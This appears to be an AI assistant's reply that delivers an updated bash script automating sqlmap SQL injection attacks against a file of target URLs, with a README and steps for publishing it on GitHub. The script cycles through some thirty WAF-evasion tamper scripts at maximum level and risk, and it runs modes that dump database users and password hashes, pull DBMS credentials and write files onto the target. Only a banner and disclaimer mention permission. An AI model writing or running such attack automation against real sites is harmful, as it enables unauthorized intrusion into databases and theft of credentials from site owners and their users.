To make the script compatible with both Arch and Debian-based systems, we'll include checks for the package manager and installation commands. Additionally, I'll provide a README file template for GitHub.

### Updated Script:

```bash
#!/bin/bash

# Function to display a colorful banner
display_banner () {
    figlet "SQLMAP AUTOMATION" | lolcat
    echo "NoBoDY HiDe fRoM mE!" | lolcat
    echo ""
    echo "@Deepak                                                            @binwalk" | lolcat
    echo ""
    echo "WARNING!!!" | lolcat
    echo "Nobody takes responsibility for your actions. Always seek permission." | lolcat
    echo ""
}

# Array of tamper scripts
tampers=('apostrophemask' 'apostrophenullencode' 'base64encode' 'between' 'bluecoat' 'chardoubleencode' 'charencode' 'charunicodeencode' 'concat2concatws' 'equaltolike' 'greatest' 'halfversionedmorekeywords' 'ifnull2ifisnull' 'modsecurityversioned' 'modsecurityzeroversioned' 'multiplespaces' 'nonrecursivereplacement' 'percentage' 'randomcase' 'randomcomments' 'securesphere' 'space2comment' 'space2dash' 'space2hash' 'space2morehash' 'space2mssqlblank' 'space2mysqldash' 'space2plus' 'space2randomblank' 'unionalltounion' 'unmagicquotes')

# Function to perform SQL injection attacks
perform_attack () {
    local attack_type=$1
    local options=$2
    
    for tamper in "${tampers[@]}"; do
        echo "##################################" | lolcat
        echo "$tamper" | lolcat
        echo "##################################" | lolcat
        sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch $options --tamper="$tamper" --alert="Vulnerability Found"
    done
}

# Function to select the type of attack to perform
select_attack () {
    select attack in "Injection-based" "File-based" "Blind-based" "Brute-based" "Time-based" "Error-based" "Out-of-band" "Bayekar" "Database Detection"; do
        case $attack in
            "Injection-based" )
                echo "(+) Injection Attacks..." | lolcat
                perform_attack "injection" "--dbs"
                break
                ;;
            "File-based" )
                echo "(+) File Based Attacks..." | lolcat
                perform_attack "file" "--dbs"
                break
                ;;
            "Blind-based" )
                echo "(+) Blind Based Attack..." | lolcat
                perform_attack "blind" "--dbms-cred"
                break
                ;;
            "Brute-based" )
                echo "(+) Brute Based Attacks..." | lolcat
                perform_attack "brute" "--users --passwords"
                break
                ;;
            "Time-based" )
                echo "(+) Time Based Attacks..." | lolcat
                perform_attack "time" "--time-sec=5 --dbs"
                break
                ;;
            "Error-based" )
                echo "(+) Error Based Attacks..." | lolcat
                perform_attack "error" "--errors"
                break
                ;;
            "Out-of-band" )
                echo "(+) Out Of Band Attacks..." | lolcat
                perform_attack "oob" "--file-write='/tmp/data.txt'"
                break
                ;;
            "Bayekar" )
                echo "(+) All attacks on a single target..." | lolcat
                echo "WARNING! This may take up to 14 hours." | lolcat
                perform_attack "bayekar" "--dbs"
                perform_attack "bayekar" "--users --passwords"
                perform_attack "bayekar" "--time-sec=5 --dbs"
                perform_attack "bayekar" "--errors"
                perform_attack "bayekar" "--file-write='/tmp/data.txt'"
                break
                ;;
            "Database Detection" )
                echo "(+) Database Detection Start..." | lolcat
                perform_attack "database" "--banner"
                continue
                ;;
            * )
                echo "Invalid selection. Please try again." | lolcat
                continue
                ;;
        esac
    done
}

# Function to install required tools
install_tools () {
    local tool="sqlmap"
    local distro=$(grep '^ID=' /etc/os-release | awk -F= '{print $2}')

    if ! command -v $tool &> /dev/null; then
        echo "$tool is not installed." | lolcat
        if [[ "$distro" == "arch" || "$distro" == "manjaro" ]]; then
            sudo pacman -Sy --noconfirm
            sudo pacman -S --noconfirm sqlmap figlet toilet lolcat
        elif [[ "$distro" == "debian" || "$distro" == "ubuntu" ]]; then
            sudo apt update -y && sudo apt install -y sqlmap figlet toilet lolcat
        else
            echo "Unsupported distribution. Please install sqlmap, figlet, toilet, and lolcat manually."
            exit 1
        fi
    else
        echo "$tool is already installed." | lolcat
    fi
}

# Function to create necessary folders
create_folders () {
    mkdir -p bugbounty/sqlmap && cd bugbounty/sqlmap || exit
}

# Main script execution
main () {
    urls=$1
    dbms=$2
    
    create_folders
    install_tools
    display_banner
    select_attack
}

# Run the main function with provided arguments
main "$@"
```

### README.md Template:

```markdown
# SQLMAP Automation Script

## Overview
This script automates various SQLMAP attacks using different tamper scripts. It is designed to work on both Arch and Debian-based systems and includes colorful output using `figlet`, `lolcat`, and `toilet`.

## Features
- Injection-based attacks
- File-based attacks
- Blind-based attacks
- Brute-based attacks
- Time-based attacks
- Error-based attacks
- Out-of-band attacks
- Database detection

## Prerequisites
- Arch-based systems: `pacman`
- Debian-based systems: `apt`
- Required tools: `sqlmap`, `figlet`, `toilet`, `lolcat`

## Installation
### For Arch-based Systems
```bash
sudo pacman -Sy --noconfirm
sudo pacman -S --noconfirm sqlmap figlet toilet lolcat
```

### For Debian-based Systems
```bash
sudo apt update -y
sudo apt install -y sqlmap figlet toilet lolcat
```

## Usage
```bash
./sqlmap_automation.sh <urls_file> <dbms>
```
- `<urls_file>`: File containing URLs to test.
- `<dbms>`: Database management system (e.g., MySQL, PostgreSQL).

## Example
```bash
./sqlmap_automation.sh urls.txt MySQL
```

## License
This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Disclaimer
This script is for educational purposes only. Use it responsibly and always seek permission before testing any systems. The author is not responsible for any misuse of this script.

## Author
Deepak aka FancybearIN

```

### Instructions for Adding to GitHub:

1. **Create a new repository** on GitHub.
2. **Clone the repository** to your local machine:
   ```bash
   git clone https://github.com/yourusername/your-repo-name.git
   ```
3. **Navigate to the repository directory**:
   ```bash
   cd your-repo-name
   ```
4. **Add the script and README file** to the repository:
   ```bash
   cp /path/to/your/sqlmap_automation.sh .
   cp /path/to/your/README.md .
   ```
5. **Commit the changes**:
   ```bash
   git add .
   git commit -m "Initial commit with script and README"
   ```
6. **Push the changes to GitHub**:
   ```bash
   git push origin main
   ```

This setup will ensure your script works on both Arch and Debian-based systems and includes a comprehensive README for GitHub. Let me know if you need any more adjustments!